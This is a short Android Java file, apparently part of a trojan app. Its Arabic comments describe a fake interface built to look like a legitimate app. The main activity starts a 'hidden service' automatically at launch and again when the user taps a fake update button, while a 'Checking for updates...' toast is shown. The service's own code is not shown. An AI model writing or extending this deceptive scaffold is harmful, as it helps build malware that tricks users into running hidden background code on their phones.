package com.legitimate.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // واجهة مزيفة تبدو كتطبيق شرعي
        Button updateButton = findViewById(R.id.update_button);
        updateButton.setOnClickListener(v -> {
            // عند الضغط على الزر، يبدأ السيرفيس الخفي
            startBackgroundService();
            Toast.makeText(this, "Checking for updates...", Toast.LENGTH_SHORT).show();
        });
        
        // بدء السيرفيس الخفي تلقائياً
        startBackgroundService();
    }
    
    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        startService(serviceIntent);
    }
}
